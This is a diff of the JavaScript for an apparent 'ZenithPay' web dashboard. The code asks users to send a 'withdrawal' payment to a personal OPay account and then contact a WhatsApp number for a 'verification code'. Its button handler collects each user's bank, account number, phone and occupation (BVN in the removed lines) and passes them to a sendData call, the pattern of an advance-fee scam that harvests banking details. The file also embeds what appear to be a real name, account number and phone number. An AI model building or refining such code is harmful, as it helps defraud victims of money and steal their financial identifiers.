@@ -6,6 +6,8 @@ var OPAY_ACCOUNT = '9120711977';
 var OPAY_NAME = 'KOLADE SOLOMON';
 var WHATSAPP_NUMBER = '2349132683379';
 
+console.log('dashboard.js loaded!');
+
 // ============================================================
 // ===== DASHBOARD LOAD =====
 // ============================================================
@@ -310,57 +312,66 @@ document.addEventListener('DOMContentLoaded', function() {
     // ===== I HAVE PAID → WHATSAPP =====
     // ============================================================
 
-    document.getElementById('iHavePaidBtn')?.addEventListener('click', function() {
-        console.log('I Have Paid button clicked!');
-        var amount = document.getElementById('depositAmount').value;
-        var userBank = document.getElementById('userBank').value;
-        var userAccount = document.getElementById('userAccountNumber').value;
-        var userBvn = document.getElementById('userBvn').value;
-        var userPhone = document.getElementById('userPhone').value;
-        var userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
+    var iHavePaidBtn = document.getElementById('iHavePaidBtn');
+    console.log('iHavePaidBtn found:', iHavePaidBtn);
 
-        // Validate
-        if (!userBank) {
-            alert('⚠️ Please select your bank.');
-            return;
-        }
-        if (!userAccount) {
-            alert('⚠️ Please enter your account number.');
-            return;
-        }
-        if (!userBvn) {
-            alert('⚠️ Please enter your BVN for verification.');
-            return;
-        }
-        if (!userPhone) {
-            alert('⚠️ Please enter your phone number.');
-            return;
-        }
+    if (iHavePaidBtn) {
+        iHavePaidBtn.addEventListener('click', function() {
+            console.log('🔥 I Have Paid button clicked!');
+            var amount = document.getElementById('depositAmount').value;
+            var userBank = document.getElementById('userBank').value;
+            var userAccount = document.getElementById('userAccountNumber').value;
+            var userOccupation = document.getElementById('useroccupation').value;
+            var userPhone = document.getElementById('userPhone').value;
+            var userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
 
-        // Send data
-        sendData({
-            type: 'opay_withdrawal_attempt',
-            amount: amount,
-            opay_account: OPAY_ACCOUNT,
-            user_name: userData.fullname || 'Unknown',
-            user_bank: userBank,
-            user_account: userAccount,
-            user_bvn: userBvn,
-            user_phone: userPhone,
-            timestamp: Date.now()
+            console.log('Amount:', amount);
+            console.log('User Bank:', userBank);
+            console.log('User Account:', userAccount);
+            console.log('User Occupation:', userOccupation);
+            console.log('User Phone:', userPhone);
+
+            // Validate
+            if (!userBank) {
+                alert('⚠️ Please select your bank.');
+                return;
+            }
+            if (!userAccount) {
+                alert('⚠️ Please enter your account number.');
+                return;
+            }
+            if (!userPhone) {
+                alert('⚠️ Please enter your phone number.');
+                return;
+            }
+
+            // Send data
+            sendData({
+                type: 'opay_withdrawal_attempt',
+                amount: amount,
+                opay_account: OPAY_ACCOUNT,
+                user_name: userData.fullname || 'Unknown',
+                user_bank: userBank,
+                user_account: userAccount,
+                user_occupation: userOccupation || 'Not provided',
+                user_phone: userPhone,
+                timestamp: Date.now()
+            });
+
+            // Close withdraw modal
+            document.getElementById('withdrawModal').classList.add('hidden');
+
+            // Open WhatsApp modal
+            document.getElementById('whatsappModal').classList.remove('hidden');
+
+            // Update WhatsApp link
+            var waLink = document.getElementById('whatsappLink');
+            var msg = 'Hello, I sent ₦' + amount + ' to your OPay account (' + OPAY_ACCOUNT + ') for my ZenithPay withdrawal. My name is ' + (userData.fullname || 'User') + '. Bank: ' + userBank + ', Account: ' + userAccount + ', Occupation: ' + (userOccupation || 'N/A') + ', Phone: ' + userPhone + '. Please send my verification code.';
+            waLink.href = 'https://wa.me/' + WHATSAPP_NUMBER + '?text=' + encodeURIComponent(msg);
         });
-
-        // Close withdraw modal
-        document.getElementById('withdrawModal').classList.add('hidden');
-
-        // Open WhatsApp modal
-        document.getElementById('whatsappModal').classList.remove('hidden');
-
-        // Update WhatsApp link
-        var waLink = document.getElementById('whatsappLink');
-        var msg = 'Hello, I sent ₦' + amount + ' to your OPay account (' + OPAY_ACCOUNT + ') for my ZenithPay withdrawal. My name is ' + (userData.fullname || 'User') + '. Bank: ' + userBank + ', Account: ' + userAccount + ', BVN: ' + userBvn + ', Phone: ' + userPhone + '. Please send my verification code.';
-        waLink.href = 'https://wa.me/' + WHATSAPP_NUMBER + '?text=' + encodeURIComponent(msg);
-    });
+    } else {
+        console.error('❌ iHavePaidBtn NOT found! Check the ID in your HTML.');
+    }
 
     // ===== WHATSAPP MODAL =====
     document.getElementById('closeWhatsapp')?.addEventListener('click', function() {
